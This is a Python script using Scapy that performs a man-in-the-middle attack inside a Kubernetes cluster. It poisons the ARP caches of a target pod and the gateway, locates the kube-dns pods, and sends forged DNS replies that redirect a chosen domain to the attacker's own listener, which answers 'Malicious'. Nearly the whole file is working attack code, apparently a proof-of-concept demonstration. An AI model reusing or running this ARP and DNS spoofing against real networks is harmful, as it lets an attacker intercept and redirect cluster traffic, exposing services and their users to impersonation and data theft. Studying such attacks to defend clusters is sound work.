from scapy.all import *
import time
import os
from threading import Thread
import socket
import argparse
import json
from termcolor import colored

# --target 10.244.1.4 --gateway 10.244.1.1 --domain example.com --malicious 10.244.1.3

class NIC(object):
    def __init__(self, ip=None, mac=None):
        self.ip, self.mac = ip, mac

parser = argparse.ArgumentParser()

parser.add_argument('--target', type=str)
parser.add_argument('--gateway', type=str)
parser.add_argument('--domain', type=str)
args = parser.parse_args()

DOMAINNAME = ''
REDIRECTEDIP = ''
DNSVIP = ''
DNSIPS = ['','']
TARGETIP = ''

DNS_SRC_PORT = 53

POD1_PACKET = IP()/UDP()/DNS()
GOT_RESPONSE = False
ARP_SPOOFING = True

Spoofer = NIC(ARP().psrc, Ether().src)


def getmac(targetip):
	arppacket= Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=targetip)
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)
    
def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print(colored('[arp-spoofing] ARP Table restored to normal for ' + targetip, 'blue'))

def get_dns_ips(subnet):
    dnsips = []
    count = 0
    hypsubnet = subnet.replace('.', '-')
    for oct in range(1, 254):
        hostname = hypsubnet + str(oct) + '.kube-dns.kube-system.svc.cluster.local.'
        res = os.system('ping -c 1 ' + hostname + ' 2> /dev/null')
        if res == 0:
            dnsips.append(subnet + str(oct))
            count += 1
        if count == 2:
            return dnsips

def catch_respone_and_send_req(packet):
    print(packet.summary())
    if packet['DNS Question Record'].qname.decode('utf-8') == DOMAINNAME + '.default.svc.cluster.local.':
        packet_a = IP(src=DNSIPS[0], dst=TARGETIP)/UDP(sport=DNS_SRC_PORT, dport=packet[UDP].dport)/DNS()
        packet_b = IP(src=DNSIPS[1], dst=TARGETIP)/UDP(sport=DNS_SRC_PORT, dport=packet[UDP].dport)/DNS()
      
        packet_a[DNS] = POD1_PACKET[DNS]
        packet_b[DNS] = POD1_PACKET[DNS]
        
        packet_a[DNS].id = packet[DNS].id
        packet_b[DNS].id = packet[DNS].id


        packet_a[DNS].qd = packet[DNSQR]
        packet_b[DNS].qd = packet[DNSQR]
        
        dnsrr = POD1_PACKET[DNS].an
        dnsrr.rrname = packet[DNSQR].qname
        dnsrr.rdata = REDIRECTEDIP
        packet_a[DNS].an = dnsrr
        packet_b[DNS].an = dnsrr
        send(packet_a)
        send(packet_b)

# def dns_req_filter(pkt):
#     return (UDP in pkt and
#             DNS in pkt and 
#             pkt[DNS].opcode == 0 and 
#             pkt[DNS].ancount == 0 and  
#             pkt[UDP].dport == 53 and
#             pkt[Ether].dst == Spoofer.mac)

def build_req_struct(packet):
    global GOT_RESPONSE, POD1_PACKET, ARP_SPOOFING
    if packet['DNS Question Record'].qname.decode('utf-8') == DOMAINNAME + '.':
        if packet[DNS].qr == 1 and not GOT_RESPONSE:
            GOT_RESPONSE = True
            POD1_PACKET = packet
            print(colored('[*] Ready to spoof ' + DOMAINNAME + ' with ' + REDIRECTEDIP, 'green'))
            while True:
                sniff(filter='udp and port 53 and host ' + TARGETIP, prn=catch_respone_and_send_req, count=16)
                time.sleep(1)
   
def get_subnet(ip):
    octets = ip.split('.')
    return octets[0] + '.' + octets[1] + '.0.'
    
def arp_spoofing(targetip, gatewayip):
    try:
        targetmac= getmac(targetip)
        print(colored('[arp-spoofing] Target MAC ' + targetmac, 'blue'))
    except:
        print(colored('[arp-spoofing] Target machine did not respond to ARP broadcast', 'red'))
        exit()

    try:
        gatewaymac= getmac(gatewayip)
        print(colored('[arp-spoofing] Gateway MAC: ' + gatewaymac, 'blue'))
    except:
        print(colored('[arp-spoofing] Gateway is unreachable', 'red'))
        exit()
    
    ips = {"targetip": TARGETIP, "targetmac": targetmac, "gatewayip": gatewayip, "gatewaymac": gatewaymac}
    with open('ips.json', 'w') as outfile:
        json.dump(ips, outfile)
    print(colored('[arp-spoofing] Sending spoofed ARP responses', 'blue'))
    while ARP_SPOOFING:
        spoofarpcache(targetip, targetmac, gatewayip)
        spoofarpcache(gatewayip, gatewaymac, targetip)
        time.sleep(1.5)
    restorearp(gatewayip, gatewaymac, targetip, targetmac)
    restorearp(targetip, targetmac, gatewayip, gatewaymac)
    print(colored('[arp-spoofing] ARP spoofing stopped', 'blue'))


def get_dns_vip():
    return socket.gethostbyname('kube-dns.kube-system.svc.cluster.local.')
    

def run_nslookup_demo(domainname):
    time.sleep(1)
    os.system('nslookup '+ domainname + ' > /dev/null')

def listener():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, \
                            socket.IPPROTO_TCP)
    server_sock.bind(('0.0.0.0', 80))
    server_sock.listen(1)

    # set up socket and connection
    while True:
        sock, addr = server_sock.accept()
        data = sock.recv(1024)
        sock.send("Malicious".encode('utf-8'))
        sock.close()

def main():
    global DOMAINNAME, REDIRECTEDIP, DNSVIP, DNSIPS, TARGETIP
    
    TARGETIP= args.target
    print(colored('Target IP: {}'.format(TARGETIP), 'yellow'))
    gatewayip= args.gateway
    print(colored('Gateway IP: {}'.format(gatewayip), 'yellow'))
    DOMAINNAME= args.domain
    print(colored('The domain name that will be spoofed: {}'.format(DOMAINNAME), 'yellow'))
    REDIRECTEDIP = socket.gethostbyname(socket.gethostname())
    print(colored('IP address of the spoofed DNS answer: {}'.format(REDIRECTEDIP), 'yellow'))
    
    
    print(colored('[*] Scanning for DNS servers', 'green'))
    DNSVIP = get_dns_vip()
    print(colored('[*] DNS Virtual IP is - ' + DNSVIP, 'green'))
    subnet = get_subnet(gatewayip)
    DNSIPS = get_dns_ips(subnet)
    print(colored('[*] Found DNS Servers - ' + DNSIPS[0] + ', ' + DNSIPS[1], 'green'))
        
    print(colored('[*] Starting MITM attack', 'green'))
    t = Thread(target=arp_spoofing, args=(TARGETIP,gatewayip))
    t.start()

    l = Thread(target=listener)
    l.start()
    
    print(colored('[*] run local nslookup to build packet structure', 'green'))
    y = Thread(target=run_nslookup_demo, args=(DOMAINNAME,))
    y.start()
    sniff(filter="udp and port 53", prn=build_req_struct, count=16)


if __name__=='__main__':
    main()
